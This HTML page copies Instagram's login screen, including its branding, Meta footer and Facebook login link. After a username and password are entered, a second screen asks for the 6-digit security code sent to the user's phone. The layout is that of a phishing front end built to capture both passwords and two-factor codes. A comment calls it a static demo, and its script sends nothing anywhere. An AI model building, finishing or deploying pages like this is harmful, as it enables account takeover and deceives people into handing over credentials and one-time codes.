<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<title>Instagram</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
<style>
  * {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    -webkit-tap-highlight-color: transparent;
  }

  html, body { height: 100%; }

  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    background: #fff;
    color: #262626;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
  }

  /* ---------- PAGE 1 ---------- */
  #page1 {
    width: 100%;
    display: flex;
    flex-direction: column;
    align-items: center;
    min-height: 100vh;
  }

  .lang-bar {
    width: 100%;
    max-width: 420px;
    padding: 14px 16px 0;
    display: flex;
    justify-content: center;
  }
  .lang-bar span { font-size: 13px; color: #737373; }

  /* ---------- LOGO ---------- */
  .logo-wrap {
    margin-top: 26px;
    text-align: center;
  }

  .insta-icon {
    width: 68px;
    height: 68px;
    margin: 0 auto 10px;
    border-radius: 20px;
    background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
    display: flex;
    align-items: center;
    justify-content: center;
    box-shadow: 0 4px 14px rgba(0,0,0,0.12);
  }

  .insta-name {
    font-family: "Grand Hotel", cursive, -apple-system, sans-serif;
    font-size: 42px;
    font-weight: 400;
    letter-spacing: 0.5px;
    color: #262626;
    line-height: 1.2;
  }

  /* ---------- CARD ---------- */
  .card {
    background: #fff;
    border: 1px solid #dbdbdb;
    border-radius: 3px;
    width: calc(100% - 32px);
    max-width: 388px;
    margin-top: 22px;
    padding: 26px 30px 22px;
  }

  .input-group {
    display: flex;
    flex-direction: column;
    gap: 6px;
    margin: 0 0 14px;
  }

  .input-group input {
    width: 100%;
    height: 40px;
    border: 1px solid #dbdbdb;
    border-radius: 3px;
    padding: 0 10px;
    font-size: 14px;
    color: #262626;
    outline: none;
    font-family: inherit;
    background: #fafafa;
    -webkit-appearance: none;
    appearance: none;
    transition: border-color .15s ease;
  }

  .input-group input::placeholder { color: #8e8e8e; }

  .input-group input:focus {
    border-color: #a8a8a8;
    background: #fafafa;
  }

  /* ---------- LOGIN BUTTON ---------- */
  .btn-login {
    width: 100%;
    height: 36px;
    background: #0095f6;
    color: #fff;
    font-size: 14px;
    font-weight: 600;
    border: none;
    border-radius: 8px;
    cursor: pointer;
    font-family: inherit;
    transition: background .15s ease;
  }
  .btn-login:hover { background: #1877f2; }
  .btn-login:active { background: #0064a8; }
  .btn-login:disabled { background: #b2dffc; cursor: default; }

  /* ---------- DIVIDER ---------- */
  .divider {
    display: flex;
    align-items: center;
    gap: 18px;
    margin: 20px 0 18px;
  }
  .divider::before,
  .divider::after {
    content: '';
    flex: 1;
    height: 1px;
    background: #dbdbdb;
  }
  .divider span {
    font-size: 13px;
    font-weight: 600;
    color: #8e8e8e;
  }

  /* ---------- FACEBOOK LINK ---------- */
  .fb-link {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    font-size: 14px;
    font-weight: 600;
    color: #385185;
    text-decoration: none;
    margin-bottom: 16px;
  }
  .fb-link:hover { text-decoration: underline; }

  .forgot-wrap { text-align: center; }
  .forgot-wrap a {
    color: #00376b;
    font-size: 12px;
    text-decoration: none;
  }
  .forgot-wrap a:hover { text-decoration: underline; }

  /* ---------- SIGNUP CARD ---------- */
  .signup-card {
    width: calc(100% - 32px);
    max-width: 388px;
    margin-top: 10px;
    background: #fff;
    border: 1px solid #dbdbdb;
    border-radius: 3px;
    padding: 20px;
    text-align: center;
    font-size: 14px;
    color: #262626;
  }
  .signup-card a {
    color: #0095f6;
    font-weight: 600;
    text-decoration: none;
  }
  .signup-card a:hover { text-decoration: underline; }

  .meta-foot {
    margin: 22px 0 26px;
    font-size: 12px;
    color: #8e8e8e;
  }

  .spacer { flex: 1; }

  /* ---------- PAGE 2 ---------- */
  #page2 {
    display: none;
    width: 100%;
    min-height: 100vh;
    background: #fff;
    flex-direction: column;
    max-width: 480px;
    margin: 0 auto;
  }

  #page2 .top-bar {
    padding: 46px 30px 0;
    text-align: center;
  }

  #page2 .lock-icon {
    width: 72px;
    height: 72px;
    margin: 0 auto 16px;
    border-radius: 50%;
    background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf);
    display: flex;
    align-items: center;
    justify-content: center;
    color: #fff;
    font-size: 30px;
    box-shadow: 0 4px 14px rgba(0,0,0,0.12);
  }

  #page2 h1 {
    font-size: 22px;
    font-weight: 700;
    color: #262626;
    margin-bottom: 8px;
  }

  #page2 .subtitle {
    font-size: 14px;
    color: #737373;
    line-height: 1.5;
    margin-bottom: 24px;
  }

  #page2 .input-section { padding: 0 30px; }

  #page2 .input-wrap {
    border: 1px solid #dbdbdb;
    border-radius: 3px;
    padding: 12px 14px;
    margin-bottom: 14px;
    background: #fafafa;
    transition: border-color .15s ease;
  }
  #page2 .input-wrap:focus-within { border-color: #a8a8a8; }

  #page2 .input-wrap input {
    width: 100%;
    border: none;
    outline: none;
    font-size: 20px;
    letter-spacing: 6px;
    font-weight: 600;
    text-align: center;
    color: #262626;
    background: transparent;
    font-family: inherit;
  }
  #page2 .input-wrap input::placeholder {
    letter-spacing: normal;
    font-weight: 400;
    font-size: 15px;
    color: #8e8e8e;
  }

  #page2 .resend-wrap {
    display: flex;
    justify-content: center;
    margin-bottom: 28px;
  }

  #page2 .resend-btn {
    background: none;
    border: none;
    cursor: pointer;
    font-size: 14px;
    font-weight: 600;
    font-family: inherit;
    color: #0095f6;
  }
  #page2 .resend-btn:hover { text-decoration: underline; }

  #page2 .bottom-section {
    margin-top: auto;
    padding: 14px 30px 26px;
  }

  #page2 .btn-next {
    width: 100%;
    padding: 14px;
    border-radius: 8px;
    border: none;
    background: #b2dffc;
    color: #fff;
    font-size: 15px;
    font-weight: 600;
    font-family: inherit;
    margin-bottom: 10px;
    pointer-events: none;
    transition: background .15s ease;
  }
  #page2 .btn-next.active {
    background: #0095f6;
    pointer-events: all;
    cursor: pointer;
  }
  #page2 .btn-next.active:hover { background: #1877f2; }
  #page2 .btn-next.active:active { background: #0064a8; }

  #page2 .btn-try {
    width: 100%;
    padding: 14px;
    border-radius: 8px;
    border: 1px solid #dbdbdb;
    background: #fff;
    color: #262626;
    font-size: 14px;
    font-weight: 600;
    font-family: inherit;
    cursor: pointer;
    transition: background .15s ease;
  }
  #page2 .btn-try:hover { background: #fafafa; }

  /* ---------- PAGE SWITCHING ---------- */
  body.show-page2 #page1 { display: none !important; }
  body.show-page2 #page2 { display: flex !important; }

  /* ---------- RESPONSIVE ---------- */
  @media (max-width: 400px) {
    .insta-name { font-size: 36px; }
    .input-group input { height: 38px; }
    .btn-login { height: 34px; }
    .card { padding: 22px 22px 18px; }
    #page2 .input-section { padding: 0 22px; }
    #page2 .bottom-section { padding: 14px 22px 22px; }
    #page2 .top-bar { padding: 36px 22px 0; }
  }
</style>
</head>
<body>

<!-- ══════════════ PAGE 1 : LOGIN ══════════════ -->
<div id="page1">
  <div class="lang-bar"><span>English</span></div>

  <div class="logo-wrap">
    <div class="insta-icon">
      <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect>
        <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path>
        <line x1="17.5" y1="6.5" x2="17.51" y2="6.5"></line>
      </svg>
    </div>
    <div class="insta-name">Instagram</div>
  </div>

  <div class="card">
    <form id="recoveryForm" autocomplete="off" novalidate>
      <div class="input-group">
        <input id="account" type="text" placeholder="Phone number, username or email" autocomplete="username" />
        <input id="password" type="password" placeholder="Password" autocomplete="current-password" />
      </div>
      <button class="btn-login" type="submit">Log in</button>
    </form>

    <div class="divider"><span>OR</span></div>

    <a class="fb-link" href="#">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="#385185"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
      Log in with Facebook
    </a>

    <div class="forgot-wrap"><a id="forgot" href="#">Forgot password?</a></div>
  </div>

  <div class="signup-card">Don't have an account? <a href="#">Sign up</a></div>

  <div class="spacer"></div>
  <div class="meta-foot">from Meta</div>
</div>

<!-- ══════════════ PAGE 2 : LOGIN CODE ══════════════ -->
<div id="page2">
  <div class="top-bar">
    <div class="lock-icon">🔒</div>
    <h1>Enter login code</h1>
    <p class="subtitle">We sent a 6-digit code to your phone.<br />Enter it below to confirm it's you.</p>
  </div>

  <div class="input-section">
    <div class="input-wrap">
      <input type="tel" id="code" placeholder="Security code" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" />
    </div>
    <div class="resend-wrap">
      <button class="resend-btn" id="resendLink" type="button">Get a new code</button>
    </div>
  </div>

  <div class="bottom-section">
    <button class="btn-next" id="page2Next" type="button" disabled>Confirm</button>
    <button class="btn-try" id="tryAnother" type="button">Try another way</button>
  </div>
</div>

<script>
  const loginForm = document.getElementById('recoveryForm');
  const account = document.getElementById('account');
  const password = document.getElementById('password');
  const code = document.getElementById('code');
  const nextBtn = document.getElementById('page2Next');

  /* code: digits only, max 6 */
  code.addEventListener('input', () => {
    code.value = code.value.replace(/\D/g, '').slice(0, 6);
    if (code.value.length === 6) {
      nextBtn.classList.add('active');
      nextBtn.disabled = false;
    } else {
      nextBtn.classList.remove('active');
      nextBtn.disabled = true;
    }
  });

  /* Page 1 → Page 2 */
  loginForm.addEventListener('submit', (e) => {
    e.preventDefault();
    if (!account.value.trim() || !password.value) {
      if (!account.value.trim()) account.focus();
      else password.focus();
      return;
    }
    document.body.classList.add('show-page2');
    setTimeout(() => code.focus(), 50);
  });

  /* Page 2 confirm */
  nextBtn.addEventListener('click', () => {
    if (code.value.length !== 6) return;
    /* static demo — nothing is sent anywhere */
  });

  document.getElementById('resendLink').addEventListener('click', (e) => {
    e.preventDefault();
    code.value = '';
    nextBtn.classList.remove('active');
    nextBtn.disabled = true;
    code.focus();
  });

  document.getElementById('tryAnother').addEventListener('click', (e) => {
    e.preventDefault();
  });
</script>

</body>
</html>
